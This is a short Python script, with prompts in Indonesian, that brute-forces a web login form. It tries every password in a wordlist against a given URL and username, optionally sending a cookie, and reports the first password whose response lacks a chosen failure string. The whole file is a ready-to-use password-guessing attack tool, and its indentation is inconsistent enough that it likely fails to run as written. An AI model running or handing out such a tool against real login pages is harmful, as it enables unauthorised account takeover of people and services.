
import requests
from termcolor import colored

url = input('[+] Masukkan URL: ')
username = input('[+] Masukin username Bruteforce: ')
file_pwd = input('[+] Masukin password file: ')
string_gagal = input('[+] masukin string kalo Login gagal: ')
cookie_value = input('masukin nilai coockies(kalo ada): ')


def cracking(username,url):
	  for password in passwords:
		password = password.strip()
		print(colored(('Coba: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data)
		if string_gagal in response.content.decode():
			pass
		else:
			print(colored(('[+] menemukan username: ==> ' + username), 'green'))
			print(colored(('[+] menemuukanp assword: ==> ' + password), 'green'))
			exit()




with open(file_pwd, 'r') as passwords:
	cracking(username,url)

print('[!!] Pass Ga ada di list')
